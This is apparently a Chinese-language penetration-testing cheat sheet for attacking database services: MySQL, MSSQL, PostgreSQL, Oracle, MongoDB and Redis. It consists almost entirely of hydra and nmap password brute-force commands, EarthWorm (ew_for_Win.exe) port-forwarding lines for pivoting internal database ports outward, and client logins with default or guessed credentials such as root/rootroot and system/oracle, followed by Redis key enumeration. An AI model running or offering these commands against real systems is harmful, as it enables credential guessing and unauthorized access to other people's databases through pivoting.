mysql(3306),mssql(1433),postgresql(5432),oracle(1521),mongodb(27017),redis(6379)

数据库大多数需要127.0.0.1的地址来进行连接

ew_for_Win.exe -s lcx_tran -l 10000 -f 127.0.0.1 -g 3306

mysql(3306)

hydra -L users.txt -P passwords.txt  mysql

ew_for_Win.exe -s lcx_tran -l 10000 -f 127.0.0.1 -g 3306

mysql -h 192.168.12.1 -P 10000 -u root -p"rootroot" [-e "show databases;"] [--skip-ssl]

mssql(1433)

hydra -L sa -P passwords.txt  mssql

mssql-cli -S localhost -U sa -P password -d master

sqsh -S server -U username -P password

postgresql(5432)

hydra -L users.txt -P passwords.txt  postgres

psql -h  -p 5432 -U  -d 

PGPASSWORD=your_password psql -h localhost -U postgres

oracle(1521)

hydra -L users.txt -P passwords.txt  oracle-listener

sqlplus username/password@//host:1521/service_name# 示例

sqlplus system/oracle@//localhost:1521/ORCL

mongodb(27017)

\# 默认可能无认证，直接尝试连接

mongo --host  --port 27017# 如果有认证

mongo "mongodb://username:password@:27017"# 使用自动化工具

nmap -p 27017 --script mongodb-brute 

\# 旧版（MongoDB 4.x及以下）

mongo --host  --port 27017 -u  -p # 新版（MongoDB 5.x+）

mongosh "mongodb://username:password@host:27017/database"# 无认证连接

mongosh --host localhost --port 27017# 指定认证数据库

mongosh --host localhost -u admin -p password --authenticationDatabase admin

redis(6379)

hydra -P passwords.txt redis://:6379

ew_for_Win.exe -s lcx_tran -l 10000 -f 127.0.0.1 -g 6379

redis-cli -h 192.168.12.1 -p 10000 [-a "yourpassword"] [--raw] #匿名登录 -a指定密码 --raw 避免中文乱码

info #查看基本信息

SCAN 0 COUNT 10 #查看所有键值